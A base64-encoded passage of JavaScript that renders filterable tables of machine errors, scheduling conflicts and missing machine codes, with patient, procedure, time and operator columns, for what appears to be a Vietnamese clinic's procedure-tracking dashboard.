QogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1taWNyb2NoaXAgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE3DoXk8L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHk+YDsNCiAgICANCiAgICBtYWNoaW5lQ29uZmxpY3RMb2cuZm9yRWFjaChjb25mbGljdCA9PiB7DQogICAgICAgIA0KCQkvL1Row6ptIGTDsm5nIHRow7RuZyB0aW4gduG7gSBtw6F5IHbDoCBuZ8OgeSB4dW5nIMSR4buZdCBjaMawYSBs4buNYw0KICAgICAgIC8vIGh0bWwgKz0gYA0KICAgICAvLyA8dHIgY2xhc3M9ImVycm9yLXJvdyIgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6ICNmZmYzY2Q7Ij4NCiAgICAgIC8vICAgICA8dGQgY29sc3Bhbj0iNSIgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsgZm9udC13ZWlnaHQ6IGJvbGQ7IGNvbG9yOiAjODU2NDA0OyI+DQogICAgICAgLy8gICAgICAgPGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSI+PC9pPiANCiAgICAgICAvLyAgICAgIFhVTkcgxJDhu5hUIE3DgVk6ICR7Y29uZmxpY3QubWFjaGluZUNvZGV9IC0gTkfDgFk6ICR7Y29uZmxpY3QuZGF0ZX0NCiAgICAgLy8gICAgICAgPC90ZD4NCiAgICAgLy8vICAgPC90cj5gOw0KICAgICAgIA0KICAgICAgICBjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMuZm9yRWFjaCgocHJvYywgaW5kZXgpID0+IHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgICR7aW5kZXggPT09IDAgPyBgPHRkIHJvd3NwYW49IiR7Y29uZmxpY3QuY29uZmxpY3RQcm9jZWR1cmVzLmxlbmd0aH0iPiR7Y29uZmxpY3QubWFjaGluZUNvZGV9PC90ZD5gIDogJyd9DQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5wYXRpZW50TmFtZX08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2MucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtjb25mbGljdC5kYXRlfSA8YnIvPiR7cHJvYy5kaXNwbGF5U3RhcnR9IOKGkiAke3Byb2MuZGlzcGxheUVuZH08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2Mub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfSk7DQogICAgICAgIA0KICAgICAgICAvLyBUaMOqbSBkw7JuZyBwaMOibiBjw6FjaCBnaeG7r2EgY8OhYyBuaMOzbSB4dW5nIMSR4buZdA0KICAgICAgICBodG1sICs9IGA8dHI+PHRkIGNvbHNwYW49IjUiIGNsYXNzPSJncm91cC1zZXBhcmF0b3IiPjwvdGQ+PC90cj5gOw0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIA0KICAgIG1hY2hpbmVDb25mbGljdExvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KICAgIG1hY2hpbmVDb25mbGljdFNlY3Rpb24uc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgDQogICAgLy8gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIGzhu41jDQogICAgdXBkYXRlTWFjaGluZUNvbmZsaWN0T3BlcmF0b3JGaWx0ZXIoKTsNCn0NCg0KLy8gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIGzhu41jIGNobyBs4buXaSBtw6F5DQpmdW5jdGlvbiB1cGRhdGVNYWNoaW5lT3BlcmF0b3JGaWx0ZXIoKSB7DQogICAgY29uc3Qgb3BlcmF0b3JzID0gWy4uLm5ldyBTZXQobWFjaGluZUVycm9yTG9nLm1hcChlcnJvciA9PiBlcnJvci5vcGVyYXRvcikpXTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lT3BlcmF0b3JTZWxlY3QnKTsNCiAgICANCiAgICBvcGVyYXRvclNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArIA0KICAgICAgICBvcGVyYXRvcnMubWFwKG9wID0+IGA8b3B0aW9uIHZhbHVlPSIke29wfSI+JHtvcC5yZXBsYWNlKC8sL2csICcnKX08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICANCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZU9wZXJhdG9yRmlsdGVyJykuc3R5bGUuZGlzcGxheSA9IG9wZXJhdG9ycy5sZW5ndGggPiAwID8gJ2Jsb2NrJyA6ICdub25lJzsNCn0NCg0KLy8gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIGzhu41jIGNobyB4dW5nIMSR4buZdCBtw6F5DQpmdW5jdGlvbiB1cGRhdGVNYWNoaW5lQ29uZmxpY3RPcGVyYXRvckZpbHRlcigpIHsNCiAgICBjb25zdCBvcGVyYXRvcnMgPSBbLi4ubmV3IFNldChtYWNoaW5lQ29uZmxpY3RMb2cuZmxhdE1hcChjb25mbGljdCA9PiANCiAgICAgICAgY29uZmxpY3QuY29uZmxpY3RQcm9jZWR1cmVzLm1hcChwcm9jID0+IHByb2Mub3BlcmF0b3IpDQogICAgKSldOw0KICAgIGNvbnN0IG9wZXJhdG9yU2VsZWN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVDb25mbGljdE9wZXJhdG9yU2VsZWN0Jyk7DQogICAgDQogICAgb3BlcmF0b3JTZWxlY3QuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKyANCiAgICAgICAgb3BlcmF0b3JzLm1hcChvcCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtvcH0iPiR7b3AucmVwbGFjZSgvLC9nLCAnJyl9PC9vcHRpb24+YCkuam9pbignJyk7DQogICAgDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVDb25mbGljdE9wZXJhdG9yRmlsdGVyJykuc3R5bGUuZGlzcGxheSA9IG9wZXJhdG9ycy5sZW5ndGggPiAwID8gJ2Jsb2NrJyA6ICdub25lJzsNCn0NCg0KLy8gTOG7jWMgbOG7l2kgbcOheSB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h24NCmZ1bmN0aW9uIGZpbHRlck1hY2hpbmVFcnJvcnNCeU9wZXJhdG9yKCkgew0KICAgIGNvbnN0IG9wZXJhdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVPcGVyYXRvclNlbGVjdCcpLnZhbHVlOw0KICAgIGNvbnN0IGZpbHRlcmVkRXJyb3JzID0gb3BlcmF0b3IgPT09ICdhbGwnIA0KICAgICAgICA/IG1hY2hpbmVFcnJvckxvZyANCiAgICAgICAgOiBtYWNoaW5lRXJyb3JMb2cuZmlsdGVyKGVycm9yID0+IGVycm9yLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpID09PSBvcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSk7DQogICAgDQogICAgZGlzcGxheUZpbHRlcmVkTWFjaGluZUVycm9ycyhmaWx0ZXJlZEVycm9ycyk7DQp9DQoNCi8vIEzhu41jIHh1bmcgxJHhu5l0IG3DoXkgdGhlbyBuZ8aw4budaSB0aOG7sWMgaGnhu4duDQpmdW5jdGlvbiBmaWx0ZXJNYWNoaW5lQ29uZmxpY3RzQnlPcGVyYXRvcigpIHsNCiAgICBjb25zdCBvcGVyYXRvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lQ29uZmxpY3RPcGVyYXRvclNlbGVjdCcpLnZhbHVlOw0KICAgIGNvbnN0IGZpbHRlcmVkQ29uZmxpY3RzID0gb3BlcmF0b3IgPT09ICdhbGwnIA0KICAgICAgICA/IG1hY2hpbmVDb25mbGljdExvZyANCiAgICAgICAgOiBtYWNoaW5lQ29uZmxpY3RMb2cuZmlsdGVyKGNvbmZsaWN0ID0+IA0KICAgICAgICAgICAgY29uZmxpY3QuY29uZmxpY3RQcm9jZWR1cmVzLnNvbWUocHJvYyA9PiANCiAgICAgICAgICAgICAgICBwcm9jLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpID09PSBvcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKQ0KICAgICAgICAgICAgKQ0KICAgICAgICApOw0KICAgIA0KICAgIGRpc3BsYXlGaWx0ZXJlZE1hY2hpbmVDb25mbGljdHMoZmlsdGVyZWRDb25mbGljdHMpOw0KfQ0KDQovLyBIaeG7g24gdGjhu4sgbOG7l2kgbcOheSDEkcOjIGzhu41jDQpmdW5jdGlvbiBkaXNwbGF5RmlsdGVyZWRNYWNoaW5lRXJyb3JzKGZpbHRlcmVkRXJyb3JzKSB7DQogICAgY29uc3QgbWFjaGluZUVycm9yTG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVFcnJvckxvZycpOw0KICAgIA0KICAgIGlmIChmaWx0ZXJlZEVycm9ycy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgbWFjaGluZUVycm9yTG9nRGl2LmlubmVySFRNTCA9ICc8cD5LaMO0bmcgY8OzIGzhu5dpIGfhuq9uIHNhaSBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1taWNyb2NoaXAgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE3DoyBtw6F5PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgZmlsdGVyZWRFcnJvcnMuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGh0bWwgKz0gYA0KICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wYXRpZW50TmFtZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kYXRlfTxici8+JHtlcnJvci5zdGFydFRpbWV9IOKGkiAke2Vycm9yLmVuZFRpbWV9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLm1hY2hpbmVDb2RlfTwvdGQ+DQogICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfSA8IS0tIMSQw6MgxJHGsOG7o2MgY+G6rXAgbmjhuq10IHbhu5tpIHRow7RuZyBiw6FvIGPhu6UgdGjhu4MgLS0+DQogICAgICAgICAgICA8L3RkPg0KICAgICAgICA8L3RyPmA7DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgbWFjaGluZUVycm9yTG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQp9DQoNCi8vIEhp4buDbiB0aOG7iyB4dW5nIMSR4buZdCBtw6F5IMSRw6MgbOG7jWMNCmZ1bmN0aW9uIGRpc3BsYXlGaWx0ZXJlZE1hY2hpbmVDb25mbGljdHMoZmlsdGVyZWRDb25mbGljdHMpIHsNCiAgICBjb25zdCBtYWNoaW5lQ29uZmxpY3RMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUNvbmZsaWN0TG9nJyk7DQogICAgDQogICAgaWYgKGZpbHRlcmVkQ29uZmxpY3RzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBtYWNoaW5lQ29uZmxpY3RMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgeHVuZyDEkeG7mXQgbcOheSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLW1pY3JvY2hpcCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTcOheTwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIGZpbHRlcmVkQ29uZmxpY3RzLmZvckVhY2goY29uZmxpY3QgPT4gew0KICAgICAgICAvLyBUaMOqbSBkw7JuZyB0aMO0bmcgdGluIHbhu4EgbcOheSB2w6AgbmfDoHkgeHVuZyDEkeG7mXQNCiAgICAgIC8vICBodG1sICs9IGANCiAgICAgIC8vICA8dHIgY2xhc3M9ImVycm9yLXJvdyIgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6ICNmZmYzY2Q7Ij4NCiAgICAgICAgLy8gICAgPHRkIGNvbHNwYW49IjUiIHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7IGZvbnQtd2VpZ2h0OiBib2xkOyBjb2xvcjogIzg1NjQwNDsiPg0KICAgICAgICAvLyAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSI+PC9pPiANCiAgICAgICAgICAvLyAgICAgIFhVTkcgxJDhu5hUIE3DgVk6ICR7Y29uZmxpY3QubWFjaGluZUNvZGV9IC0gTkfDgFk6ICR7Y29uZmxpY3QuZGF0ZX0NCiAgICAgICAgIC8vICAgPC90ZD4NCiAgICAgIC8vICA8L3RyPmA7DQogICAgICAgIA0KICAgICAgICBjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMuZm9yRWFjaCgocHJvYywgaW5kZXgpID0+IHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgICR7aW5kZXggPT09IDAgPyBgPHRkIHJvd3NwYW49IiR7Y29uZmxpY3QuY29uZmxpY3RQcm9jZWR1cmVzLmxlbmd0aH0iPiR7Y29uZmxpY3QubWFjaGluZUNvZGV9PC90ZD5gIDogJyd9DQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5wYXRpZW50TmFtZX08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2MucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtjb25mbGljdC5kYXRlfTxici8+JHtwcm9jLmRpc3BsYXlTdGFydH0g4oaSICR7cHJvYy5kaXNwbGF5RW5kfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICAgICAgPC90cj5gOw0KICAgICAgICB9KTsNCiAgICAgICAgDQogICAgICAgIGh0bWwgKz0gYDx0cj48dGQgY29sc3Bhbj0iNSIgY2xhc3M9Imdyb3VwLXNlcGFyYXRvciI+PC90ZD48L3RyPmA7DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgbWFjaGluZUNvbmZsaWN0TG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQp9DQovLyBIw6BtIGhp4buDbiB0aOG7iyBs4buXaSBxdcOqbiBn4bqvbiBtw6MgbcOheQ0KZnVuY3Rpb24gZGlzcGxheU1pc3NpbmdNYWNoaW5lRXJyb3JzKCkgew0KICAgIGNvbnN0IG1pc3NpbmdNYWNoaW5lTG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21pc3NpbmdNYWNoaW5lTG9nJyk7DQogICAgY29uc3QgbWlzc2luZ01hY2hpbmVTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21pc3NpbmdNYWNoaW5lU2VjdGlvbicpOw0KICAgIA0KICAgIGlmIChtaXNzaW5nTWFjaGluZUxvZy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgbWlzc2luZ01hY2hpbmVMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgbOG7l2kgcXXDqm4gZ+G6r24gbcOjIG3DoXkgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC9wPic7DQogICAgICAgIG1pc3NpbmdNYWNoaW5lU2VjdGlvbi5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2FsZW5kYXItYWx0IGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8OgeSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgbWlzc2luZ01hY2hpbmVMb2cuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGh0bWwgKz0gYA0KICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wYXRpZW50TmFtZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kYXRlfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLnN0YXJ0VGltZX0g4oaSICR7ZXJyb3IuZW5kVGltZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICANCiAgICAgICAgPC90cj5gOw0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIA0KICAgIG1pc3NpbmdNYWNoaW5lTG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQogICAgbWlzc2luZ01hY2hpbmVTZWN0aW9uLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIA0KICAgIC8vIEPhuq1wIG5o4bqtdCBkcm9wZG93biBs4buNYw0KICAgIHVwZGF0ZU1pc3NpbmdNYWNoaW5lT3BlcmF0b3JGaWx0ZXIoKTsNCn0NCg0KLy8gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIGzhu41jIGNobyBxdcOqbiBn4bqvbiBtw6MgbcOheQ0KZnVuY3Rpb24gdXBkYXRlTWlzc2luZ01hY2hpbmVPcGVyYXRvckZpbHRlcigpIHsNCiAgICBjb25zdCBvcGVyYXRvcnMgPSBbLi4ubmV3IFNldChtaXNzaW5nTWFjaGluZUxvZy5tYXAoZXJyb3IgPT4gZXJyb3Iub3BlcmF0b3IpKV07DQogICAgY29uc3Qgb3BlcmF0b3JTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWlzc2luZ01hY2hpbmVPcGVyYXRvclNlbGVjdCcpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsgDQogICAgICAgIG9wZXJhdG9ycy5tYXAob3AgPT4gYDxvcHRpb24gdmFsdWU9IiR7b3B9Ij4ke29wLnJlcGxhY2UoLywvZywgJycpfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtaXNzaW5nTWFjaGluZU9wZXJhdG9yRmlsdGVyJykuc3R5bGUuZGlzcGxheSA9IG9wZXJhdG9ycy5sZW5ndGggPiAwID8gJ2Jsb2NrJyA6ICdub25lJzsNCn0NCg0KLy8gTOG7jWMgcXXDqm4gZ+G6r24gbcOjIG3DoXkgdGhlbyBuZ8aw4budaSB0aOG7sWMgaGnhu4duDQpmdW5jdGlvbiBmaWx0ZXJNaXNzaW5nTWFjaGluZUJ5T3BlcmF0b3IoKSB7DQogICAgY29uc3Qgb3BlcmF0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWlzc2luZ01hY2hpbmVPcGVyYXRvclNlbGVjdCcpLnZhbHVlOw0KICAgIGNvbnN0IGZpbHRlcmVkRXJyb3JzID0gb3BlcmF0b3IgPT09ICdhbGwnIA0KICAgICAgICA/IG1pc3NpbmdNYWNoaW5lTG9nIA0KICAgICAgICA6IG1pc3NpbmdNYWNoaW5lTG9nLmZpbHRlcihlcnJvciA9PiBlcnJvci5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA9PT0gb3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykpOw0KICAgIA0KICAgIGRpc3BsYXlGaWx0ZXJlZE1pc3NpbmdNYWNoaW5lRXJyb3JzKGZpbHRlcmVkRXJyb3JzKTsNCn0NCg0KLy8gSGnhu4NuIHRo4buLIGzhu5dpIHF1w6puIGfhuq9uIG3DoyBtw6F5IMSRw6MgbOG7jWMNCmZ1bmN0aW9uIGRpc3BsYXlGaWx0ZXJlZE1pc3NpbmdNYWNoaW5lRXJyb3JzKGZpbHRlcmVkRXJyb3JzKSB7DQogICAgY29uc3QgbWlzc2luZ01hY2hpbmVMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWlzc2luZ01hY2hpbmVMb2cnKTsNCiAgICANCiAgICBpZiAoZmlsdGVyZWRFcnJvcnMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIG1pc3NpbmdNYWNoaW5lTG9nRGl2LmlubmVySFRNTCA9ICc8cD5LaMO0bmcgY8OzIGzhu5dpIHF1w6puIGfhuq9uIG3DoyBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2FsZW5kYXItYWx0IGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8OgeSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgICAgDQogICAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHk+YDsNCiAgICANCiAgICBmaWx0ZXJlZEVycm9ycy5mb3JFYWNoKGVycm9yID0+IHsNCiAgICAgICAgaHRtbCArPSBgDQogICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnBhdGllbnROYW1lfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgICAgICA8dGQ+PG